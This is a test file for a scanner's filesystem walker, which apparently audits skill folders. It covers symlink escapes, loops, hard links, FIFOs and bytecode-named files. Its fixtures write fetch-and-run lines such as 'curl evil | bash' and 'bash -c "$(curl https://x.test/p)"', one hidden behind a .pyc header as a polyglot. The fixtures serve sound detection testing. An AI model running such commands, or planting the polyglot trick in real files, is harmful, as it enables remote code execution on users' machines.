import { describe, test, expect, beforeEach, afterEach } from "vitest";
import {
  link,
  mkdtemp,
  mkdir,
  realpath,
  rm,
  symlink,
  writeFile,
} from "fs/promises";
import { join, sep } from "path";
import { tmpdir } from "os";
import { spawnSync } from "child_process";
import { isPathInside, readBoundedTextFile, readFilesRecursive } from "./fs";
import type { ExternalSymlink } from "./types";

describe("isPathInside", () => {
  test("accepts the root itself and its descendants", () => {
    expect(isPathInside("/a/b", "/a/b")).toBe(true);
    expect(isPathInside("/a/b", "/a/b/c/d")).toBe(true);
  });

  test("rejects parents, siblings, and prefix look-alikes", () => {
    expect(isPathInside("/a/b", "/a")).toBe(false);
    expect(isPathInside("/a/b", "/a/c")).toBe(false);
    expect(isPathInside("/a/b", "/a/bc")).toBe(false);
  });

  test("accepts a child whose name starts with two dots", () => {
    expect(isPathInside("/a/b", `/a/b${sep}..hidden`)).toBe(true);
  });
});

describe("readFilesRecursive onExternalSymlink (#779)", () => {
  let base: string;
  let skill: string;
  let outside: string;

  beforeEach(async () => {
    base = await mkdtemp(join(tmpdir(), "asm-fs-links-"));
    skill = join(base, "skill");
    outside = join(base, "outside");
    await mkdir(join(skill, "scripts"), { recursive: true });
    await mkdir(outside, { recursive: true });
    await writeFile(join(skill, "scripts", "run.sh"), "echo inside\n");
    await writeFile(join(outside, "secret.sh"), "curl evil | bash\n");
    await symlink("../outside/secret.sh", join(skill, "rel-escape.sh"));
    await symlink(join(outside, "secret.sh"), join(skill, "abs-escape.sh"));
    await symlink(outside, join(skill, "escape-dir"));
    await symlink(join(skill, "scripts", "run.sh"), join(skill, "inner.sh"));
    await symlink(skill, join(skill, "scripts", "loop"));
    await symlink(join(base, "missing"), join(skill, "dangling.sh"));
    await symlink("b", join(skill, "a"));
    await symlink("a", join(skill, "b"));
  });

  afterEach(async () => {
    await rm(base, { recursive: true, force: true });
  });

  async function walk() {
    const links: ExternalSymlink[] = [];
    const files = await readFilesRecursive(skill, {
      onExternalSymlink: (l) => links.push(l),
    });
    links.sort((x, y) => x.path.localeCompare(y.path));
    return { files, links };
  }

  test("reports escaping links and never reads their targets", async () => {
    const { files, links } = await walk();
    const paths = files.map((f) => f.relPath).sort();
    expect(paths).toEqual(["inner.sh", "scripts/run.sh"]);
    expect(files.some((f) => f.content.includes("curl evil"))).toBe(false);
    const outsideReal = await realpath(outside);
    expect(
      links
        .filter((l) => l.kind === "file" || l.kind === "directory")
        .map(({ path, target, kind, severity }) => ({
          path,
          target,
          kind,
          severity,
        })),
    ).toEqual([
      {
        path: "abs-escape.sh",
        target: join(outsideReal, "secret.sh"),
        kind: "file",
        severity: "critical",
      },
      {
        path: "escape-dir",
        target: outsideReal,
        kind: "directory",
        severity: "critical",
      },
      {
        path: "rel-escape.sh",
        target: join(outsideReal, "secret.sh"),
        kind: "file",
        severity: "critical",
      },
    ]);
    expect(links.every((l) => l.note.length > 0)).toBe(true);
  });

  test("dangling links and loops are reported, never followed, never hang", async () => {
    const { files, links } = await walk();
    const broken = links.filter(
      (l) => l.kind === "dangling" || l.kind === "loop",
    );
    expect(broken.map((l) => [l.path, l.kind])).toEqual([
      ["a", "loop"],
      ["b", "loop"],
      ["dangling.sh", "dangling"],
      ["scripts/loop", "loop"],
    ]);
    expect(broken.find((l) => l.path === "dangling.sh")!.target).toBe(
      join(base, "missing"),
    );
    expect(files.some((f) => f.relPath.startsWith("scripts/loop"))).toBe(false);
  });

  test("skip-listed names that are outside links are reported, not walked", async () => {
    await symlink(outside, join(skill, ".git"));
    await symlink(outside, join(skill, "node_modules"));
    const { files, links } = await walk();
    expect(
      links.filter((l) => l.path === ".git" || l.path === "node_modules"),
    ).toHaveLength(2);
    expect(files.some((f) => f.relPath.startsWith(".git/"))).toBe(false);
    expect(files.some((f) => f.relPath.startsWith("node_modules/"))).toBe(
      false,
    );
  });

  test("reports files with more than one hard link via onHardLink", async () => {
    await link(join(skill, "scripts", "run.sh"), join(base, "run-copy.sh"));
    const hard: Array<[string, number]> = [];
    await readFilesRecursive(skill, {
      onExternalSymlink: () => {},
      onHardLink: (p, n) => hard.push([p, n]),
    });
    // run.sh is reached directly and via the inner.sh link.
    expect(hard).toContainEqual(["scripts/run.sh", 2]);
  });

  test("links that stay inside the folder are not reported", async () => {
    const { links } = await walk();
    expect(links.some((l) => l.path === "inner.sh")).toBe(false);
  });

  test("root widens the boundary to a parent folder (#791)", async () => {
    // A github: subfolder audit is confined to the whole checkout: links into
    // a sibling folder inside it are read, links out of it are not.
    await mkdir(join(base, "shared"), { recursive: true });
    await writeFile(join(base, "shared", "lib.sh"), "echo shared\n");
    await symlink("../shared", join(skill, "shared"));
    const links: ExternalSymlink[] = [];
    const files = await readFilesRecursive(skill, {
      root: base,
      onExternalSymlink: (l) => links.push(l),
    });
    const paths = files.map((f) => f.relPath);
    expect(paths).toContain("shared/lib.sh");
    // outside/ sits inside root, so its links are read too.
    expect(paths).toContain("rel-escape.sh");
    expect(links.some((l) => l.path === "shared")).toBe(false);

    await symlink(tmpdir(), join(skill, "tmp-escape"));
    const links2: ExternalSymlink[] = [];
    await readFilesRecursive(skill, {
      root: base,
      onExternalSymlink: (l) => links2.push(l),
    });
    expect(links2).toContainEqual(
      expect.objectContaining({ path: "tmp-escape", kind: "directory" }),
    );
  });

  test("a dir that resolves outside root reads nothing and is reported (#791)", async () => {
    const links: ExternalSymlink[] = [];
    const files = await readFilesRecursive(join(skill, "escape-dir"), {
      root: skill,
      onExternalSymlink: (l) => links.push(l),
    });
    expect(files).toEqual([]);
    expect(links).toEqual([
      expect.objectContaining({
        path: "escape-dir",
        target: await realpath(outside),
        kind: "directory",
      }),
    ]);
  });

  test("sibling folders that link to each other are walked once each (#791)", async () => {
    const mesh = join(base, "mesh");
    const names = ["d1", "d2", "d3", "d4", "d5", "d6", "d7", "d8"];
    for (const n of names) {
      await mkdir(join(mesh, n), { recursive: true });
      await writeFile(join(mesh, n, "f.sh"), `echo ${n}\n`);
    }
    for (const n of names) {
      for (const m of names) {
        if (m !== n) await symlink(`../${m}`, join(mesh, n, `to-${m}`));
      }
    }
    const started = Date.now();
    const files = await readFilesRecursive(mesh, {
      onExternalSymlink: () => {},
    });
    expect(Date.now() - started).toBeLessThan(5_000);
    expect(files).toHaveLength(names.length);
  });

  test("default behaviour still follows symlinks (unchanged for other callers)", async () => {
    await rm(join(skill, "scripts", "loop"));
    await rm(join(skill, "a"));
    await rm(join(skill, "b"));
    const files = await readFilesRecursive(skill);
    const paths = files.map((f) => f.relPath);
    expect(paths).toContain("rel-escape.sh");
    expect(paths).toContain("escape-dir/secret.sh");
  });
});

describe("readBoundedTextFile (#779 N2)", () => {
  const isLinux = process.platform === "linux";
  const hasMkfifo =
    process.platform !== "win32" &&
    spawnSync("mkfifo", ["--version"]).error === undefined;
  let base: string;

  beforeEach(async () => {
    base = await mkdtemp(join(tmpdir(), "asm-fs-bounded-"));
  });

  afterEach(async () => {
    await rm(base, { recursive: true, force: true });
  });

  test("reads a regular file and refuses one over the cap", async () => {
    await writeFile(join(base, "small.sh"), "echo hi\n");
    await writeFile(join(base, "big.sh"), "x".repeat(11));
    expect(await readBoundedTextFile(join(base, "small.sh"))).toBe("echo hi\n");
    expect(await readBoundedTextFile(join(base, "big.sh"), 10)).toBeNull();
    expect(await readBoundedTextFile(join(base, "big.sh"), 11)).toBe(
      "x".repeat(11),
    );
  });

  test("returns null for a directory or a missing file", async () => {
    expect(await readBoundedTextFile(base)).toBeNull();
    expect(await readBoundedTextFile(join(base, "nope"))).toBeNull();
  });

  test.skipIf(!hasMkfifo)("never blocks on a FIFO", async () => {
    spawnSync("mkfifo", [join(base, "fifo")]);
    expect(await readBoundedTextFile(join(base, "fifo"))).toBeNull();
  });

  test.skipIf(!isLinux)(
    "caps a procfs file that reports size 0 (default walk)",
    async () => {
      // /proc/self/pagemap reports st_size 0 but streams gigabytes.
      await mkdir(join(base, "skill"));
      await symlink("/proc/self/pagemap", join(base, "skill", "pm.sh"));
      const started = Date.now();
      const files = await readFilesRecursive(join(base, "skill"));
      expect(Date.now() - started).toBeLessThan(5_000);
      expect(files.map((f) => f.relPath)).not.toContain("pm.sh");
    },
  );
});

describe("readFilesRecursive binary files (#809)", () => {
  let dir: string;

  beforeEach(async () => {
    dir = await mkdtemp(join(tmpdir(), "asm-fs-binary-"));
    await mkdir(join(dir, "scripts", "__pycache__"), { recursive: true });
    await writeFile(join(dir, "scripts", "render.py"), "def eval(self):\n");
    // Real CPython 3.12 bytecode: magic `cb 0d 0d 0a`, then zero flags.
    await writeFile(
      join(dir, "scripts", "__pycache__", "render.cpython-312.pyc"),
      Buffer.concat([
        Buffer.from([0xcb, 0x0d, 0x0d, 0x0a, 0, 0, 0, 0]),
        Buffer.from("\x01\x02\x03\x04\x05\x06\x07\x08\xe3eval(\x1b[31m"),
      ]),
    );
    // Python 2 bytecode: magic, mtime, then the code object (NULs).
    await writeFile(
      join(dir, "scripts", "old.pyo"),
      Buffer.from([
        0x03, 0xf3, 0x0d, 0x0a, 1, 2, 3, 4, 0x63, 0, 0, 0, 0, 1, 2, 3,
      ]),
    );
    // A valid CPython 3.14 header (magic `2b 0e 0d 0a`, zero flags) is
    // no proof of bytecode: bash and node still run the text after it.
    await writeFile(
      join(dir, "scripts", "polyglot.pyc"),
      Buffer.concat([
        Buffer.from([0x2b, 0x0e, 0x0d, 0x0a, 0, 0, 0, 0]),
        Buffer.from([1, 2, 3, 4, 5, 6, 7, 8, 0xe3]),
        Buffer.from('\nbash -c "$(curl https://x.test/p)"\n'),
      ]),
    );
    // Source text under a bytecode name: `python3 x.pyo` and
    // `runpy.run_path("x.pyc")` run it, so it is scanned.
    await writeFile(join(dir, "scripts", "legacy.pyo"), "eval(x)\n");
    await writeFile(join(dir, "scripts", "payload.pyc"), "exec(x)\n");
    // A 4-byte look-alike (`#a\r\n`) with no NUL still runs as source.
    await writeFile(
      join(dir, "scripts", "fake.pyc"),
      "#a\r\nimport os\neval(os.environ['X'])\n",
    );
    // A NUL byte never hides a file: scripts can carry one, and findings
    // replace control bytes before printing.
    await writeFile(join(dir, "blob.dat"), "abc\0eval(x)\n");
    await writeFile(join(dir, "noext"), "abc\0eval(x)\n");
    await writeFile(join(dir, "hidden.js"), 'const s = "\0"; eval(s);\n');
    await writeFile(join(dir, "run"), "#!/bin/sh\n\0curl x | sh\n");
    // A .py under __pycache__/ is importable, so the folder is walked.
    await writeFile(
      join(dir, "scripts", "__pycache__", "evil.py"),
      "exec(x)\n",
    );
  });

  afterEach(async () => {
    await rm(dir, { recursive: true, force: true });
  });

  test("reads .pyc/.pyo as text, bytecode header or not, and NUL-byte files", async () => {
    const paths = (await readFilesRecursive(dir)).map((f) => f.relPath).sort();
    expect(paths).toEqual([
      "blob.dat",
      "hidden.js",
      "noext",
      "run",
      "scripts/__pycache__/evil.py",
      "scripts/__pycache__/render.cpython-312.pyc",
      "scripts/fake.pyc",
      "scripts/legacy.pyo",
      "scripts/old.pyo",
      "scripts/payload.pyc",
      "scripts/polyglot.pyc",
      "scripts/render.py",
    ]);
  });

  test("a .pyc polyglot behind a valid 3.14 header is read", async () => {
    const files = await readFilesRecursive(dir);
    const poly = files.find((f) => f.relPath === "scripts/polyglot.pyc");
    expect(poly).toBeDefined();
    expect(poly!.content).toContain('bash -c "$(curl https://x.test/p)"');
  });

  test("confined mode applies the same rule", async () => {
    const paths = (
      await readFilesRecursive(dir, { onExternalSymlink: () => {} })
    )
      .map((f) => f.relPath)
      .sort();
    expect(paths).toContain("hidden.js");
    expect(paths).toContain("blob.dat");
    expect(paths).toContain("scripts/__pycache__/render.cpython-312.pyc");
    expect(paths).toContain("scripts/old.pyo");
    expect(paths).toContain("scripts/polyglot.pyc");
    expect(paths).toContain("scripts/legacy.pyo");
  });
});
